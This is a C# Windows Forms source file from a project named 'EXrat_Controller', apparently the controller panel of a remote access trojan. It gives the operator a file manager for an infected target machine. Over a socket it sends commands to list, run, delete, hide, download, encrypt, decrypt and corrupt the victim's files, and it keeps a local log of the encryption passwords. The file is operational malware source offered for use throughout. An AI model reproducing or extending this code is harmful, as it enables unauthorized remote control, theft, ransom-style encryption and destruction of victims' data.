using Microsoft.VisualBasic;
using System;
using System.Data;
using System.IO;
using System.Linq;
using System.Windows.Forms;

namespace EXrat_Controller
{
    public partial class Form3 : Form
    {
        public string Target = "";
        private ListViewItem ItemEdited = null;
        private bool IsEditing = false;

        public Form3()
        {
            InitializeComponent();

        }
        public void ItemsFromCommand(string Command)
        {

            string[] Folders = Command.Split(new string[] { "&*(", ")*&" }, StringSplitOptions.None);
            foreach (string CommandArg in Folders.Take(Folders.Count() - 1).Skip(1).Where(s => !string.IsNullOrWhiteSpace(s)))
            {
                listView1.Items.Add(new ListViewItem(new string[] { CommandArg, "File folder" }));
            }
            foreach (string CommandArg in Command.Split(new string[] { "&!(", ")!&" }, StringSplitOptions.None).Skip(1).Where(s => !string.IsNullOrWhiteSpace(s)))
            {
                if (CommandArg.Contains("."))
                {
                    listView1.Items.Add(new ListViewItem(new string[] { CommandArg, Path.GetExtension(CommandArg) + " File" }));
                }
                else
                {
                    listView1.Items.Add(new ListViewItem(new string[] { CommandArg, "File" }));
                }
            }
        }
        public void InitForm3()
        {
            Text = Target + "'s Files";
        }
        private void listView1_MouseDoubleClick(object sender, MouseEventArgs e)
        {
            if (listView1.SelectedItems.Count == 1)
            {
                if (listView1.SelectedItems[0].SubItems[1].Text == "File folder")
                {
                    if (textBox1.Text == "Root")
                    {
                        textBox1.Text = listView1.SelectedItems[0].SubItems[0].Text;
                    }
                    else
                    {
                        textBox1.Text = textBox1.Text + listView1.SelectedItems[0].SubItems[0].Text + "\\";
                    }

                    Form1.SocketToBW(Form1.connections, Target).Write("!tree \"" + Target + "\" " + "\"" + textBox1.Text + "\"");
                }
                else
                {
                    Form1.SocketToBW(Form1.connections, Target).Write("!start \"" + Target + "\" " + "\"" + textBox1.Text + listView1.SelectedItems[0].SubItems[0].Text + "\"");
                }
            }
        }

        private void textBox1_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter)
            {
                if (textBox1.Text != "Root")
                {
                    Form1.SocketToBW(Form1.connections, Target).Write("!tree \"" + Target + "\" " + "\"" + textBox1.Text + "\"");
                }
            }
        }

        private void pictureBox1_Click(object sender, EventArgs e)
        {
            if (textBox1.Text.Count(f => f == '\\') > 1)
            {
                string[] splits = textBox1.Text.Split('\\');
                textBox1.Text = string.Join("\\", splits.Take(splits.Count() - 2)) + "\\";
                Form1.SocketToBW(Form1.connections, Target).Write("!tree \"" + Target + "\" " + "\"" + textBox1.Text + "\"");
            }
        }

        private void deleteToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Form1.SocketToBW(Form1.connections, Target).Write("!delete \"" + Target + "\" " + "\"" + textBox1.Text + listView1.SelectedItems[0].SubItems[0].Text + "\"");
            listView1.Items.Remove(listView1.SelectedItems[0]);
        }

        private void getToolStripMenuItem_Click(object sender, EventArgs e)
        {
            FolderBrowserDialog FBD = new FolderBrowserDialog();

            if (FBD.ShowDialog() == DialogResult.OK)
            {
                Form1.Savelocation = FBD.SelectedPath + "/" + listView1.SelectedItems[0].SubItems[0].Text;
            }
            Form1.SocketToBW(Form1.connections, Target).Write("!getfile \"" + Target + "\" " + "\"" + textBox1.Text + listView1.SelectedItems[0].SubItems[0].Text + "\"");


        }

        private void Form3_Load(object sender, EventArgs e)
        {

        }

        private void openToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Form1.SocketToBW(Form1.connections, Target).Write("!start \"" + Target + "\" " + "\"" + textBox1.Text + listView1.SelectedItems[0].SubItems[0].Text + "\"");
        }

        private void hideToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Form1.SocketToBW(Form1.connections, Target).Write("!hide \"" + Target + "\" " + "\"" + textBox1.Text + listView1.SelectedItems[0].SubItems[0].Text + "\"");

        }

        private void decryptToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                if (!File.Exists("Passwrds.txt"))
                {
                    File.Create("Passwrds.txt");
                }

                string Text = File.ReadAllText("Passwrds.txt");
                string Path = textBox1.Text + listView1.SelectedItems[0].SubItems[0].Text;
                if (Text.Contains(Path))
                {
                    string TargetLine = Text.Split(new string[] { Environment.NewLine }, StringSplitOptions.None).Where(s => s.Contains(Path)).First();
                    string Passwrd = TargetLine.Split(':').Last();
                    Text.Replace(TargetLine, string.Empty);
                    Form1.SocketToBW(Form1.connections, Target).Write("!Decrypt \"" + Target + "\" " + "\"" + Path + "\" \"" + Passwrd + "\"");
                    //File.WriteAllText(Path, Text);
                }
                else
                {
                    string Passwrd = Interaction.InputBox("Password: ", "decrypt");
                    Form1.SocketToBW(Form1.connections, Target).Write("!Decrypt \"" + Target + "\" " + "\"" + Path + "\" \"" + Passwrd + "\"");
                }
                MessageBox.Show("Decryption sucessful!");
            }
            catch
            {
                MessageBox.Show("Decryption failed!");
            }

        }

        private void encryptToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {

                if (!File.Exists("Passwrds.txt"))
                {
                    File.Create("Passwrds.txt");
                }

                string Text = File.ReadAllText("Passwrds.txt");

                string Passwrd = Interaction.InputBox("Password: ", "Encrypt");

                Form1.SocketToBW(Form1.connections, Target).Write("!Encrypt \"" + Target + "\" " + "\"" + textBox1.Text + listView1.SelectedItems[0].SubItems[0].Text + "\" \"" + Passwrd + "\"");

                Text = Text + "\r\n" + Target + ":" + textBox1.Text + listView1.SelectedItems[0].SubItems[0].Text + Passwrd;
                File.WriteAllText("Passwrds.txt", Text);
                MessageBox.Show("Encryption sucessful!");
            }
            catch
            {
                MessageBox.Show("Encryption failed!");
            }
        }

        private void corruptToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string Path = textBox1.Text + listView1.SelectedItems[0].SubItems[0].Text;
            Form1.SocketToBW(Form1.connections, Target).Write("!corrupt \"" + Target + "\" " + "\"" + Path + "\"");
        }

        private void Form3_DragDrop(object sender, DragEventArgs e)
        {
            string[] DraggedItems = (string[])e.Data.GetData(DataFormats.FileDrop, false);

        }

        private void folderToolStripMenuItem_Click(object sender, EventArgs e)
        {
            ListViewItem NewFolder = new ListViewItem(new string[] { "New Folder", "File folder" });

            //NewFolder.ForeColor = Color.DarkRed;
            ItemEdited = listView1.Items.Add(NewFolder);
            ItemEdited.BeginEdit();
            IsEditing = true;
        }

        private void listView1_AfterLabelEdit(object sender, LabelEditEventArgs e)
        {
            IsEditing = false;

        }
    }
}